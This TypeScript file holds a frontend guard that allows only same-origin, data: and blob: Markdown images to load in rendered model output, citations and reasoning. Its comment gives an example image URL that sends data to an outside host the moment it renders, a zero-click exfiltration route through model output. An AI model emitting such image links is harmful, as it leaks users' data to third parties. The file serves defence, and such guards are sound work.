/**
 * Which Markdown image sources may load (SEC-09).
 *
 * Markdown here is not written by the reader: it is model output, the draft
 * stream before any server-side filter has seen it, retrieved document text in
 * a citation, and the model's reasoning. An image there is fetched the moment
 * it renders, so `![](https://elsewhere/?q=<anything>)` sends whatever its URL
 * was made to carry without anybody clicking. Only sources that stay on this
 * origin load; everything else is shown as text by MarkdownBlock.
 */
export function isLoadableImageSource(src: string | undefined, origin: string): boolean {
  const value = (src ?? "").trim();
  if (!value) return false;
  const lowered = value.toLowerCase();
  if (lowered.startsWith("data:image/") || lowered.startsWith("blob:")) return true;
  try {
    // Relative and protocol-relative URLs resolve against the page; the second
    // kind ("//elsewhere/x") is how a relative-looking URL leaves the origin.
    return new URL(value, origin).origin === origin;
  } catch {
    return false;
  }
}

/** The host to name in the placeholder, or the raw text when it is not a URL. */
export function imageSourceHost(src: string | undefined, origin: string): string {
  const value = (src ?? "").trim();
  try {
    return new URL(value, origin).host || value;
  } catch {
    return value;
  }
}
